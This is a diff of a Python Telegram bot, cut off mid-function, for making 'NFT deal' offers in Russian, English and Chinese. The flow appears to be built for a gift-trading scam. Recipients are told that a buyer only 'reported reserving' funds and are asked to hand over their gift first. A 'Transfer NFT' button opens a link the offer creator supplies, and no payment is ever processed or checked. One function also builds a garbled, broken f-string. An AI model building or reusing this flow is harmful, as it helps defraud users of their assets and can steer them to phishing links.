@@ -4,21 +4,39 @@ import random
 import string
 
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import (
-    Message, CallbackQuery, InlineKeyboardMarkup,
-    InlineKeyboardButton, InlineQuery, InlineQueryResultArticle,
-    InputTextMessageContent, SwitchInlineQueryChosenChat
-)
-from aiogram.filters import Command, CommandStart
+from aiogram.filters import CommandStart, Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import (
+    Message,
+    CallbackQuery,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton,
+    InlineQuery,
+    InlineQueryResultArticle,
+    InputTextMessageContent,
+    SwitchInlineQueryChosenChat,
+)
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_BOT_TOKEN") or ""
+
+# =========================================================
+# CONFIG
+# =========================================================
+
+BOT_TOKEN = (
+    os.getenv("BOT_TOKEN")
+    or os.getenv("TELEGRAM_BOT_TOKEN")
+    or ""
+)
 
 ADMINS = {6977407005, 5068550043}
+
+# =========================================================
+# CUSTOM EMOJI
+# =========================================================
 
 EMOJI_MAP = {
     "👀": "5920052658743283381",
@@ -41,20 +59,17 @@ EMOJI_MAP = {
 
 
 def e(text: str) -> str:
-    for k in sorted(EMOJI_MAP, key=len, reverse=True):
+    for emoji in sorted(EMOJI_MAP, key=len, reverse=True):
         text = text.replace(
-            k,
-            f'<tg-emoji emoji-id="{EMOJI_MAP[k]}">{k}</tg-emoji>'
+            emoji,
+            f'<tg-emoji emoji-id="{EMOJI_MAP[emoji]}">{emoji}</tg-emoji>'
         )
     return text
 
 
-CURRENCY_NAMES = {
-    "⭐": "Star",
-    "🪓": "Rub",
-    "🔷": "Gram",
-    "💲": "Dollar",
-}
+# =========================================================
+# LANGUAGES
+# =========================================================
 
 LANGUAGES = {
     "ru": {"flag": "🇷🇺", "name": "Русский"},
@@ -62,166 +77,208 @@ LANGUAGES = {
     "zh": {"flag": "🇨🇳", "name": "中文"},
 }
 
+CURRENCIES = {
+    "⭐": {"ru": "Stars", "en": "Stars", "zh": "Stars"},
+    "🪓": {"ru": "RUB", "en": "RUB", "zh": "RUB"},
+    "🔷": {"ru": "Gram", "en": "Gram", "zh": "Gram"},
+    "💲": {"ru": "USD", "en": "USD", "zh": "USD"},
+}
+
 TEXTS = {
     "ru": {
         "choose_language": "🌐 Выберите язык",
-        "language_changed": "✅ Язык изменён на Русский",
+        "language_changed": "Язык изменён.",
         "welcome": (
             "✈️ Добро пожаловать!\n\n"
-            "Создавайте офферы, отправляйте предложения другим пользователям "
-            "и отслеживайте сделки.\n\n"
-            "После сделки с вами связывается администратор."
+            "Создавайте офферы и отправляйте предложения другим пользователям."
         ),
-        "btn_create_offer": "Создать оффер",
-        "btn_exit": "Выйти",
-        "btn_settings": "Настройки",
-        "btn_back": "Назад",
-        "t_username": (
-            "🐶 Пришлите @username человека, которому хотите сделать оффер. "
-            "Если человек ещё не запускал бота, оффер будет отправлен после запуска."
+        "create_offer": "Создать оффер",
+        "settings": "Настройки",
+        "exit": "Выйти",
+        "back": "Назад",
+        "enter_username": "🐶 Укажите @username получателя.",
+        "enter_link": "🗓️ Пришлите ссылку на подарок.",
+        "choose_currency": "❓ Выберите валюту сделки.",
+        "enter_amount": "👛 Укажите сумму сделки числом.",
+        "choose_offer_language": "🌐 Выберите язык оффера.",
+        "confirm_offer": "Создать оффер",
+        "offer_created": "✅ Оффер создан. Вы можете поделиться им в другом чате.",
+        "share": "📤 Поделиться оффером",
+        "accept": "Принять",
+        "reject": "Отклонить",
+        "transfer": "Transfer NFT",
+        "confirm_transfer": "Подтвердить передачу",
+        "invalid_username": "Укажите корректный @username.",
+        "invalid_amount": "Сумма должна быть целым положительным числом.",
+        "no_access": "У вас нет доступа к созданию офферов.",
+        "share_expired": "Оффер недоступен.",
+        "not_recipient": "Вы не можете управлять этим оффером.",
+        "deal_instructions": (
+            "Сделка по NFT\n"
+            "Заказ #{trade_id}\n\n"
+            "Покупатель заявил о резервировании {amount} {currency} "
+            "для этой сделки. Фактическое наличие средств необходимо "
+            "проверить отдельно.\n\n"
+            "Инструкции для завершения сделки:\n\n"
+            "1. Передайте подарок пользователю: @{recipient}\n"
+            "2. Нажмите «Transfer NFT» и выберите подарок: {link}\n"
+            "3. Подтвердите передачу подарка.\n\n"
+            "После подтверждения заявка будет отправлена администраторам "
+            "на проверку.\n\n"
+            "Указанный срок бронирования: 24 часа."
         ),
-        "t_link": "🗓️ Пришлите ссылку на подарок или подарки (каждый с новой строки)",
-        "t_currency": "❓ В какой валюте проводим сделку?",
-        "t_amount": "👛 Укажите сумму сделки",
-        "t_offer_language": "🌐 Выберите язык оффера",
-        "t_confirm": "✈️ Оффер готов к отправке.",
-        "btn_confirm": "Создать оффер",
-        "btn_share": "📤 Поделиться оффером",
-        "btn_reject": "Отклонить",
-        "btn_accept": "Принять",
-        "btn_transfer": "Подтвердить передачу",
-        "offer_to_recipient": (
-            "Пользователь предлагает вам {amount} {currency} за подарок:\n{link}"
+        "submitted": (
+            "✅ Информация о передаче отправлена администраторам на проверку.\n\n"
+            "Это сообщение не подтверждает фактическое получение средств "
+            "или завершение транзакции."
         ),
-        "offer_created": "✅ Оффер создан.\n\nВы можете поделиться им в другом чате.",
-        "notify_sent": (
-            "✈️ Вы создали оффер на сумму {amount} {currency} "
-            "для пользователя {recipient}."
-        ),
-        "accept_alert": (
-            "Внимание!\n\n"
-            "Проверяйте условия сделки и получателя перед передачей подарка."
-        ),
-        "trade_text": (
-            "Сделка по NFT. Заказ #{trade_id}\n\n"
+        "admin_review": (
+            "🔎 Заявка на проверку сделки\n\n"
+            "Заказ: #{trade_id}\n"
+            "Создатель оффера: @{creator}\n"
+            "Получатель: @{recipient}\n"
             "Сумма: {amount} {currency}\n"
-            "Продавец: @{creator}\n"
-            "Подарок: {link}\n\n"
-            "Проверьте все условия сделки перед передачей подарка."
+            "Подарок: {link}\n"
+            "Подтвердил передачу: {user}\n"
+            "Telegram ID: {user_id}"
         ),
-        "transfer_done": "👛 Действие отмечено. Спасибо!",
-        "invalid_username": "Пришлите корректный @username",
-        "invalid_amount": "Введите целое число",
-        "verify_required": "Вы ещё не получили доступ к созданию офферов. Запрос отправлен администраторам.",
-        "share_help": "Выберите чат через кнопку ниже, чтобы поделиться оффером.",
-        "share_expired": "Оффер больше недоступен.",
-        "not_yours": "Управлять этим оффером может только его получатель.",
+        "no_admins": "Не удалось отправить заявку администраторам.",
+        "admin_received": "Заявка отправлена администраторам.",
+        "offer_rejected": "Оффер отклонён.",
+        "already_processed": "Этот оффер уже обработан.",
         "inline_title": "Оффер #{oid}",
-        "inline_description": "Отправить оффер с кнопками в выбранный чат",
+        "inline_description": "Поделиться оффером с кнопками",
     },
+
     "en": {
         "choose_language": "🌐 Choose language",
-        "language_changed": "✅ Language changed to English",
+        "language_changed": "Language changed.",
         "welcome": (
             "✈️ Welcome!\n\n"
-            "Create offers, send proposals to other users and track deals.\n\n"
-            "An administrator will contact you after a deal."
+            "Create offers and send proposals to other users."
         ),
-        "btn_create_offer": "Create offer",
-        "btn_exit": "Exit",
-        "btn_settings": "Settings",
-        "btn_back": "Back",
-        "t_username": (
-            "🐶 Send the @username of the person you want to make an offer to. "
-            "If they haven't started the bot, the offer will be delivered after they do."
+        "create_offer": "Create offer",
+        "settings": "Settings",
+        "exit": "Exit",
+        "back": "Back",
+        "enter_username": "🐶 Enter the recipient's @username.",
+        "enter_link": "🗓️ Send the gift link.",
+        "choose_currency": "❓ Choose the deal currency.",
+        "enter_amount": "👛 Enter the deal amount as a number.",
+        "choose_offer_language": "🌐 Choose the offer language.",
+        "confirm_offer": "Create offer",
+        "offer_created": "✅ Offer created. You can share it in another chat.",
+        "share": "📤 Share offer",
+        "accept": "Accept",
+        "reject": "Decline",
+        "transfer": "Transfer NFT",
+        "confirm_transfer": "Confirm transfer",
+        "invalid_username": "Enter a valid @username.",
+        "invalid_amount": "The amount must be a positive whole number.",
+        "no_access": "You don't have permission to create offers.",
+        "share_expired": "This offer is unavailable.",
+        "not_recipient": "You cannot manage this offer.",
+        "deal_instructions": (
+            "NFT Deal\n"
+            "Order #{trade_id}\n\n"
+            "The buyer has reported reserving {amount} {currency} for this deal. "
+            "The actual availability of funds must be verified separately.\n\n"
+            "Instructions to complete the deal:\n\n"
+            "1. Transfer the gift to: @{recipient}\n"
+            "2. Tap “Transfer NFT” and select the gift: {link}\n"
+            "3. Confirm the gift transfer.\n\n"
+            "After confirmation, the request will be submitted to the administrators "
+            "for review.\n\n"
+            "Stated reservation period: 24 hours."
         ),
-        "t_link": "🗓️ Send the gift link or links (one per line)",
-        "t_currency": "❓ Which currency will be used?",
-        "t_amount": "👛 Enter the deal amount",
-        "t_offer_language": "🌐 Choose the offer language",
-        "t_confirm": "✈️ Your offer is ready.",
-        "btn_confirm": "Create offer",
-        "btn_share": "📤 Share offer",
-        "btn_reject": "Decline",
-        "btn_accept": "Accept",
-        "btn_transfer": "Confirm transfer",
-        "offer_to_recipient": (
-            "A user offers you {amount} {currency} for the gift:\n{link}"
+        "submitted": (
+            "✅ The transfer information has been sent to the administrators "
+            "for review.\n\n"
+            "This message does not confirm receipt of funds or completion "
+            "of the transaction."
         ),
-        "offer_created": "✅ Offer created.\n\nYou can share it in another chat.",
-        "notify_sent": (
-            "✈️ You created an offer for {amount} {currency} "
-            "for {recipient}."
-        ),
-        "accept_alert": (
-            "Attention!\n\n"
-            "Check the deal terms and recipient before transferring a gift."
-        ),
-        "trade_text": (
-            "NFT deal. Order #{trade_id}\n\n"
+        "admin_review": (
+            "🔎 Deal review request\n\n"
+            "Order: #{trade_id}\n"
+            "Offer creator: @{creator}\n"
+            "Recipient: @{recipient}\n"
             "Amount: {amount} {currency}\n"
-            "Seller: @{creator}\n"
-            "Gift: {link}\n\n"
-            "Check the deal terms before transferring the gift."
+            "Gift: {link}\n"
+            "Transfer confirmation submitted by: {user}\n"
+            "Telegram ID: {user_id}"
         ),
-        "transfer_done": "👛 Action recorded. Thank you!",
-        "invalid_username": "Send a valid @username",
-        "invalid_amount": "Enter an integer",
-        "verify_required": "You don't have permission to create offers yet. A request was sent to the administrators.",
-        "share_help": "Choose a chat using the button below to share the offer.",
-        "share_expired": "This offer is no longer available.",
-        "not_yours": "Only the intended recipient can manage this offer.",
+        "no_admins": "Could not send the request to the administrators.",
+        "admin_received": "Request sent to the administrators.",
+        "offer_rejected": "Offer declined.",
+        "already_processed": "This offer has already been processed.",
         "inline_title": "Offer #{oid}",
-        "inline_description": "Send the offer with action buttons to a chat",
+        "inline_description": "Share the offer with action buttons",
     },
+
     "zh": {
         "choose_language": "🌐 请选择语言",
-        "language_changed": "✅ 语言已切换为中文",
-        "welcome": (
-            "✈️ 欢迎！\n\n"
-            "创建报价、向其他用户发送提议并跟踪交易。\n\n"
-            "交易后，管理员会与您联系。"
+        "language_changed": "语言已更改。",
+        "welcome": "✈️ 欢迎！\n\n创建报价并向其他用户发送交易提议。",
+        "create_offer": "创建报价",
+        "settings": "设置",
+        "exit": "退出",
+        "back": "返回",
+        "enter_username": "🐶 请输入接收方的 @username。",
+        "enter_link": "🗓️ 请发送礼物链接。",
+        "choose_currency": "❓ 请选择交易货币。",
+        "enter_amount": "👛 请输入整数金额。",
+        "choose_offer_language": "🌐 请选择报价语言。",
+        "confirm_offer": "创建报价",
+        "offer_created": "✅ 报价已创建。您可以将其分享到其他聊天。",
+        "share": "📤 分享报价",
+        "accept": "接受",
+        "reject": "拒绝",
+        "transfer": "Transfer NFT",
+        "confirm_transfer": "确认转移",
+        "invalid_username": "请输入有效的 @username。",
+        "invalid_amount": "金额必须为正整数。",
+        "no_access": "您没有创建报价的权限。",
+        "share_expired": "此报价不可用。",
+        "not_recipient": "您不能管理此报价。",
+        "deal_instructions": (
+            "NFT 交易\n"
+            "订单 #{trade_id}\n\n"
+            "买家表示已为此交易预留 {amount} {currency}。"
+            "实际资金情况需要另行核实。\n\n"
+            "完成交易的步骤：\n\n"
+            "1. 将礼物转移给用户：@{recipient}\n"
+            "2. 点击“Transfer NFT”并选择礼物：{link}\n"
+            "3. 确认礼物转移。\n\n"
+            "确认后，申请将提交给管理员审核。\n\n"
+            "标示的预留期限：24 小时。"
         ),
-        "btn_create_offer": "创建报价",
-        "btn_exit": "退出",
-        "btn_settings": "设置",
-        "btn_back": "返回",
-        "t_username": (
-            "🐶 请发送对方的 @username。如果对方尚未启动机器人，"
-            "启动后即可收到报价。"
+        "submitted": (
+            "✅ 转移信息已提交给管理员审核。\n\n"
+            "此消息不代表资金已到账或交易已完成。"
         ),
-        "t_link": "🗓️ 请发送礼物链接，多个链接请每行填写一个",
-        "t_currency": "❓ 请选择交易货币",
-        "t_amount": "👛 请输入交易金额",
-        "t_offer_language": "🌐 请选择报价语言",
-        "t_confirm": "✈️ 报价已准备好。",
-        "btn_confirm": "创建报价",
-        "btn_share": "📤 分享报价",
-        "btn_reject": "拒绝",
-        "btn_accept": "接受",
-        "btn_transfer": "确认转移",
-        "offer_to_recipient": "用户愿意支付 {amount} {currency} 购买礼物：\n{link}",
-        "offer_created": "✅ 报价已创建。\n\n您可以将报价分享到其他聊天。",
-        "notify_sent": "✈️ 您已为 {recipient} 创建 {amount} {currency} 的报价。",
-        "accept_alert": "注意！\n\n转移礼物前，请核实交易条件和接收方。",
-        "trade_text": (
-            "NFT 交易。订单 #{trade_id}\n\n"
+        "admin_review": (
+            "🔎 交易审核申请\n\n"
+            "订单：#{trade_id}\n"
+            "报价创建者：@{creator}\n"
+            "接收方：@{recipient}\n"
             "金额：{amount} {currency}\n"
-            "卖家：@{creator}\n"
-            "礼物：{link}\n\n"
-            "转移礼物前，请核实交易条件。"
+            "礼物：{link}\n"
+            "提交确认的用户：{user}\n"
+            "Telegram ID：{user_id}"
         ),
-        "transfer_done": "👛 操作已记录，谢谢！",
-        "invalid_username": "请发送有效的 @username",
-        "invalid_amount": "请输入整数",
-        "verify_required": "您尚未获得创建报价的权限。请求已发送给管理员。",
-        "share_help": "请点击下方按钮选择要分享报价的聊天。",
-        "share_expired": "此报价已不可用。",
-        "not_yours": "只有指定接收方才能管理此报价。",
+        "no_admins": "无法向管理员发送申请。",
+        "admin_received": "申请已发送给管理员。",
+        "offer_rejected": "报价已拒绝。",
+        "already_processed": "此报价已处理。",
         "inline_title": "报价 #{oid}",
-        "inline_description": "将带操作按钮的报价发送到聊天",
+        "inline_description": "分享带操作按钮的报价",
     },
 }
+
+
+# =========================================================
+# IN-MEMORY DATA
+# =========================================================
 
 user_langs = {}
 verified_handles = set()
@@ -231,29 +288,40 @@ offers = {}
 pending_offers = {}
 
 
-def get_lang(uid):
-    return user_langs.get(uid, "ru")
+def get_lang(user_id):
+    return user_langs.get(user_id, "ru")
 
 
-def t(uid, key, **kwargs):
-    lang = get_lang(uid)
-    result = TEXTS.get(lang, TEXTS["ru"]).get(
+def tr(lang, key, **kwargs):
+    template = TEXTS.get(lang, TEXTS["ru"]).get(
         key, TEXTS["ru"].get(key, key)
     )
-    if kwargs:
-        try:
-            result = result.format(**kwargs)
-        except (KeyError, IndexError):
-            pass
-    return result
+    return template.format(**kwargs) if kwargs else template
 
 
-storage = MemoryStorage()
+def currency_name(currency, lang):
+    return CURRENCIES.get(currency, {}).get(lang, currency)
+
+
+def make_id():
+    return "TG-" + "".join(
+        random.choices(string.ascii_uppercase + string.digits, k=8)
+    )
+
+
+# =========================================================
+# BOT
+# =========================================================
+
+if not BOT_TOKEN:
+    raise RuntimeError("Установите переменную окружения BOT_TOKEN.")
+
 bot = Bot(
     BOT_TOKEN,
     default=DefaultBotProperties(parse_mode=ParseMode.HTML)
 )
-dp = Dispatcher(storage=storage)
+
+dp = Dispatcher(storage=MemoryStorage())
 
 
 class OfferFlow(StatesGroup):
@@ -264,168 +332,166 @@ class OfferFlow(StatesGroup):
     offer_language = State()
 
 
+# =========================================================
+# KEYBOARDS
+# =========================================================
+
 def main_menu_kb(uid):
+    lang = get_lang(uid)
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(
-            text=t(uid, "btn_create_offer"),
-            callback_data="create_offer",
-            icon_custom_emoji_id=EMOJI_MAP["➕"]
+            text=tr(lang, "create_offer"),
+            callback_data="create_offer"
         )],
         [InlineKeyboardButton(
-            text="⚙️ " + t(uid, "btn_settings"),
+            text="⚙️ " + tr(lang, "settings"),
             callback_data="settings"
         )],
         [InlineKeyboardButton(
-            text=t(uid, "btn_exit"),
-            callback_data="exit_main",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+            text=tr(lang, "exit"),
+            callback_data="exit"
         )],
     ])
 
 
-def back_kb(uid, target):
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text=t(uid, "btn_back"),
-            callback_data=f"back:{target}",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
-        )
-    ]])
-
-
-def language_kb(prefix="lang", include_back=False, uid=None):
-    rows = []
-    for code, info in LANGUAGES.items():
-        rows.append([InlineKeyboardButton(
-            text=f"{info['flag']} {info['name']}",
+def language_kb(prefix="lang", lang=None):
+    rows = [
+        [InlineKeyboardButton(
+            text=f"{item['flag']} {item['name']}",
             callback_data=f"{prefix}:{code}"
-        )])
-    if include_back and uid is not None:
+        )]
+        for code, item in LANGUAGES.items()
+    ]
+
+    if lang:
         rows.append([InlineKeyboardButton(
-            text=t(uid, "btn_back"),
-            callback_data="back:main",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
+            text=tr(lang, "back"),
+            callback_data="back:main"
         )])
+
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
 def currency_kb(uid):
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [
-            InlineKeyboardButton(
-                text="Star",
-                callback_data="cur:⭐",
-                icon_custom_emoji_id=EMOJI_MAP["⭐"]
-            ),
-            InlineKeyboardButton(
-                text="Rub",
-                callback_data="cur:🪓",
-                icon_custom_emoji_id=EMOJI_MAP["🪓"]
-            ),
-        ],
-        [
-            InlineKeyboardButton(
-                text="Gram",
-                callback_data="cur:🔷",
-                icon_custom_emoji_id=EMOJI_MAP["🔷"]
-            ),
-            InlineKeyboardButton(
-                text="Dollar",
-                callback_data="cur:💲",
-                icon_custom_emoji_id=EMOJI_MAP["💲"]
-            ),
-        ],
-        [InlineKeyboardButton(
-            text=t(uid, "btn_back"),
-            callback_data="back:link",
-            icon_custom_emoji_id=EMOJI_MAP["⬅️"]
-        )],
-    ])
+    lang = get_lang(uid)
+    rows = []
+
+    for currency in ("⭐", "🪓", "🔷", "💲"):
+        rows.append([InlineKeyboardButton(
+            text=currency_name(currency, lang),
+            callback_data=f"currency:{currency}"
+        )])
+
+    rows.append([InlineKeyboardButton(
+        text=tr(lang, "back"),
+        callback_data="back:link"
+    )])
+
+    return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
-def confirm_kb(uid):
+def share_kb(oid):
+    offer = offers[oid]
+    lang = get_lang(offer["creator_id"])
+
     return InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(
-            text=t(uid, "btn_confirm"),
-            callback_data="confirm_offer",
-            icon_custom_emoji_id=EMOJI_MAP["✅"]
-        )
-    ]])
-
-
-def gen_id(n=8):
-    return "TG-" + "".join(
-        random.choices(string.ascii_uppercase + string.digits, k=n)
-    )
-
-
-def offer_text(offer_id, lang):
-    o = offers.get(offer_id)
-    if not o:
-        return TEXTS[lang]["share_expired"]
-
-    return TEXTS[lang]["offer_to_recipient"].format(
-        amount=o["amount"],
-        currency=o["currency"],
-        link=o["link"]
-    )
-
-
-def offer_actions_kb(offer_id, lang):
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text=TEXTS[lang]["btn_reject"],
-            callback_data=f"reject:{offer_id}",
-            icon_custom_emoji_id=EMOJI_MAP["✖️"]
-        ),
-        InlineKeyboardButton(
-            text=TEXTS[lang]["btn_accept"],
-            callback_data=f"accept:{offer_id}",
-            icon_custom_emoji_id=EMOJI_MAP["✅"]
-        ),
-    ]])
-
-
-def share_kb(offer_id):
-    return InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(
-            text=TEXTS[user_langs.get(offers[offer_id]["creator_id"], "ru")]["btn_share"],
+            text=tr(lang, "share"),
             switch_inline_query_chosen_chat=SwitchInlineQueryChosenChat(
-                query=f"offer_{offer_id}",
+                query=f"offer_{oid}",
                 allow_user_chats=True,
                 allow_group_chats=True,
                 allow_channel_chats=False,
-                allow_bot_chats=False
+                allow_bot_chats=False,
             )
         )
     ]])
 
 
-async def deliver_pending(uid, username):
+def offer_actions_kb(oid, lang):
+    return InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(
+            text=tr(lang, "reject"),
+            callback_data=f"reject:{oid}"
+        ),
+        InlineKeyboardButton(
+            text=tr(lang, "accept"),
+            callback_data=f"accept:{oid}"
+        ),
+    ]])
+
+
+def transfer_kb(oid, lang):
+    return InlineKeyboardMarkup(inline_keyboard=[[
+        InlineKeyboardButton(
+            text=tr(lang, "transfer"),
+            url=offers[oid]["link"]
+        )
+    ], [
+        InlineKeyboardButton(
+            text=tr(lang, "confirm_transfer"),
+            callback_data=f"transfer:{oid}"
+        )
+    ]])
+
+
+# =========================================================
+# OFFER MESSAGE
+# =========================================================
+
+def public_offer_text(oid):
+    offer = offers[oid]
+    lang = offer["offer_language"]
+    currency = currency_name(offer["currency"], lang)
+
+    return (
+        f"{tr(lang, 'deal_instructions', "
+        f"trade_id=oid, amount=offer['amount'], currency=currency, "
+        f"recipient=offer['recipient'].lstrip('@'), link=offer['link'])}"
+    )
+
+
+async def send_pending_offers(user_id, username):
     if not username:
         return
 
-    uname = username.lower()
-    for oid in list(pending_offers.get(uname, [])):
-        if oid not in offers or offers[oid]["status"] != "pending":
+    normalized = username.lower().lstrip("@")
+    ids = pending_offers.pop(normalized, [])
+
+    for oid in ids:
+        offer = offers.get(oid)
+        if not offer or offer["status"] != "pending":
             continue
+
+        lang = offer["offer_language"]
         try:
             await bot.send_message(
-                uid,
-                e(offer_text(oid, offers[oid]["offer_language"])),
-                reply_markup=offer_actions_kb(
-                    oid, offers[oid]["offer_language"]
-                )
+                user_id,
+                e(
+                    tr(
+                        lang,
+                        "deal_instructions",
+                        trade_id=oid,
+                        amount=offer["amount"],
+                        currency=currency_name(offer["currency"], lang),
+                        recipient=offer["recipient"].lstrip("@"),
+                        link=offer["link"],
+                    )
+                ),
+                reply_markup=offer_actions_kb(oid, lang)
             )
         except Exception:
-            continue
+            pending_offers.setdefault(normalized, []).append(oid)
 
-    pending_offers.pop(uname, None)
 
+# =========================================================
+# START / LANGUAGE
+# =========================================================
 
 @dp.message(CommandStart())
-async def cmd_start(message: Message, state: FSMContext):
+async def start(message: Message, state: FSMContext):
     await state.clear()
+
     uid = message.from_user.id
     started_users.add(uid)
 
@@ -439,417 +505,585 @@ async def cmd_start(message: Message, state: FSMContext):
         )
         return
 
+    lang = get_lang(uid)
     await message.answer(
-        e(t(uid, "welcome")),
+        e(tr(lang, "welcome")),
         reply_markup=main_menu_kb(uid)
     )
-    await deliver_pending(uid, message.from_user.username)
+
+    await send_pending_offers(uid, message.from_user.username)
 
 
 @dp.callback_query(F.data.startswith("lang:"))
-async def cb_lang(cb: CallbackQuery):
-    code = cb.data.split(":", 1)[1]
-    if code not in LANGUAGES:
-        await cb.answer()
+async def set_language(callback: CallbackQuery):
+    uid = callback.from_user.id
+    lang = callback.data.split(":", 1)[1]
+
+    if lang not in LANGUAGES:
+        await callback.answer()
         return
 
-    uid = cb.from_user.id
-    user_langs[uid] = code
+    user_langs[uid] = lang
     started_users.add(uid)
 
-    if cb.from_user.username:
-        username_to_id[cb.from_user.username.lower()] = uid
+    if callback.from_user.username:
+        username_to_id[callback.from_user.username.lower()] = uid
 
-    await cb.message.edit_text(
-        e(t(uid, "welcome")),
+    await callback.message.edit_text(
+        e(tr(lang, "welcome")),
         reply_markup=main_menu_kb(uid)
     )
-    await cb.answer(t(uid, "language_changed"))
-    await deliver_pending(uid, cb.from_user.username)
+    await callback.answer(tr(lang, "language_changed"))
+
+    await send_pending_offers(uid, callback.from_user.username)
+
+
+@dp.callback_query(F.data == "settings")
+async def settings(callback: CallbackQuery):
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+
+    await callback.message.edit_text(
+        tr(lang, "choose_language"),
+        reply_markup=language_kb(prefix="lang", lang=lang)
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "back:main")
+async def back_main(callback: CallbackQuery, state: FSMContext):
+    await state.clear()
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+
+    await callback.message.edit_text(
+        e(tr(lang, "welcome")),
+        reply_markup=main_menu_kb(uid)
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "exit")
+async def exit_menu(callback: CallbackQuery, state: FSMContext):
+    await state.clear()
+    try:
+        await callback.message.delete()
+    except Exception:
+        pass
+    await callback.answer()
+
+
+# =========================================================
+# CREATE OFFER
+# =========================================================
+
+@dp.callback_query(F.data == "create_offer")
+async def create_offer(callback: CallbackQuery, state: FSMContext):
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+
+    username = (callback.from_user.username or "").lower()
+
+    if uid not in ADMINS and username not in verified_handles:
+        await callback.answer(tr(lang, "no_access"), show_alert=True)
+
+        for admin_id in ADMINS:
+            try:
+                await bot.send_message(
+                    admin_id,
+                    f"Запрос доступа от @{callback.from_user.username or uid} "
+                    f"(ID: {uid}).\n"
+                    f"Выдать доступ: /dostup @{callback.from_user.username or ''}"
+                )
+            except Exception:
+                pass
+        return
+
+    await state.set_state(OfferFlow.username)
+    await callback.message.edit_text(
+        e(tr(lang, "enter_username")),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(
+                text=tr(lang, "back"),
+                callback_data="back:main"
+            )
+        ]])
+    )
+    await callback.answer()
+
+
+@dp.message(OfferFlow.username)
+async def enter_username(message: Message, state: FSMContext):
+    uid = message.from_user.id
+    lang = get_lang(uid)
+    recipient = (message.text or "").strip()
+
+    if not recipient.startswith("@") or len(recipient) < 2:
+        await message.answer(tr(lang, "invalid_username"))
+        return
+
+    await state.update_data(recipient=recipient)
+    await state.set_state(OfferFlow.link)
+
+    await message.answer(
+        e(tr(lang, "enter_link")),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(
+                text=tr(lang, "back"),
+                callback_data="back:username"
+            )
+        ]])
+    )
+
+
+@dp.callback_query(F.data == "back:username")
+async def back_username(callback: CallbackQuery, state: FSMContext):
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+    await state.set_state(OfferFlow.username)
+
+    await callback.message.edit_text(
+        e(tr(lang, "enter_username")),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(
+                text=tr(lang, "back"),
+                callback_data="back:main"
+            )
+        ]])
+    )
+    await callback.answer()
+
+
+@dp.message(OfferFlow.link)
+async def enter_link(message: Message, state: FSMContext):
+    uid = message.from_user.id
+    lang = get_lang(uid)
+    link = (message.text or "").strip()
+
+    if not link:
+        await message.answer(tr(lang, "enter_link"))
+        return
+
+    await state.update_data(link=link)
+    await state.set_state(OfferFlow.currency)
+
+    await message.answer(
+        e(tr(lang, "choose_currency")),
+        reply_markup=currency_kb(uid)
+    )
+
+
+@dp.callback_query(F.data == "back:link")
+async def back_link(callback: CallbackQuery, state: FSMContext):
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+
+    await state.set_state(OfferFlow.link)
+    await callback.message.edit_text(
+        e(tr(lang, "enter_link")),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(
+                text=tr(lang, "back"),
+                callback_data="back:username"
+            )
+        ]])
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("currency:"))
+async def choose_currency(callback: CallbackQuery, state: FSMContext):
+    currency = callback.data.split(":", 1)[1]
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+
+    if currency not in CURRENCIES:
+        await callback.answer()
+        return
+
+    await state.update_data(currency=currency)
+    await state.set_state(OfferFlow.amount)
+
+    await callback.message.edit_text(
+        e(tr(lang, "enter_amount")),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton(
+                text=tr(lang, "back"),
+                callback_data="back:currency"
+            )
+        ]])
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "back:currency")
+async def back_currency(callback: CallbackQuery, state: FSMContext):
+    uid = callback.from_user.id
+    lang = get_lang(uid)
+    await state.set_state(OfferFlow.currency)
+
+    await callback.message.edit_text(
+        e(tr(lang, "choose_currency")),
+        reply_markup=currency_kb(uid)
+    )
+    await callback.answer()
+
+
+@dp.message(OfferFlow.amount)
+async def enter_amount(message: Message, state: FSMContext):
+    uid = message.from_user.id
+    lang = get_lang(uid)
+    raw = (message.text or "").strip()
+
+    if not raw.isdigit() or int(raw) <= 0:
+        await message.answer(tr(lang, "invalid_amount"))
+        return
+
+    await state.update_data(amount=int(raw))
+    await state.set_state(OfferFlow.offer_language)
+
+    await message.answer(
+        e(tr(lang, "choose_offer_language")),
+        reply_markup=language_kb(prefix="offerlang")
+    )
 
 
 @dp.callback_query(F.data.startswith("offerlang:"))
-async def cb_offerlang(cb: CallbackQuery, state: FSMContext):
-    code = cb.data.split(":", 1)[1]
-    if code not in LANGUAGES:
-        await cb.answer()
+async def choose_offer_language(callback: CallbackQuery, state: FSMContext):
+    uid = callback.from_user.id
